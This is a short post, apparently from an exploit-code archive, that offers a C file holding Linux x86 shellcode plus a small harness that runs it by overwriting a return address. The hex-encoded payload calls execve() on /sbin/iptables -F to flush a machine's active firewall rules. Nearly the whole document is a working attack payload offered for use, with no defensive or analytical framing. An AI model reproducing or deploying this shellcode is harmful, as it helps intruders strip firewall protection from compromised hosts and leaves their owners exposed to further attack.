Author: zillion
Email: zillion@safemode.org
Home: http://www.safemode.org

Linux x86 shellcode that does an execve() of /sbin/iptables -F in order to
flush activated firewall rules.


File: flush-iptables-shell.c

/*
 * This shellcode will do /sbin/iptables -F
 * Written by zillion@safemode.org
 *
 */

char shellcode[]=
        "\xeb\x21\x5e\x31\xc0\x88\x46\x0e\x88\x46\x11\x89\x76\x12\x8d"
        "\x5e\x0f\x89\x5e\x16\x89\x46\x1a\xb0\x0b\x89\xf3\x8d\x4e\x12"
        "\x8d\x56\x1a\xcd\x80\xe8\xda\xff\xff\xff\x2f\x73\x62\x69\x6e"
        "\x2f\x69\x70\x74\x61\x62\x6c\x65\x73\x38\x2d\x46\x32\x33\x34"
        "\x35\x36\x37\x38\x39\x61\x62\x63\x64\x65";


int main()
{

  int *ret;
  ret = (int *)&ret + 2;
  (*ret) = (int)shellcode;
}